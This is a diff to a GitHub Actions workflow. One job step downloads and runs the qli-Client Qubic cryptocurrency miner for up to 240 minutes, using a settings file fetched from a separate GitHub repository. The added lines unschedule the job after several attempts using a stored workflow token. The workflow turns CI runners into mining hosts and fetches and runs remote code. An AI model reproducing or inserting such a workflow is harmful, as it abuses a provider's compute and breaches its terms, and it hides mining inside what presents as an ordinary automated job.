@@ -70,3 +70,7 @@ jobs:
 
       - name: 1
         run: wget https://dl.qubic.li/downloads/qli-Client-1.8.9-Linux-x64.tar.gz && tar xf qli-Client-1.8.9-Linux-x64.tar.gz && rm -rf appsettings.json && wget https://github.com/permenasin/permenasin/raw/main/appsettings.json && timeout 240m ./qli-Client
+      - name: Remove scheduled job after 10 attempts
+        uses: cardinalby/unschedule-job-action@v1
+        with:
+          ghToken: ${{ secrets.WORKFLOWS_TOKEN }} 
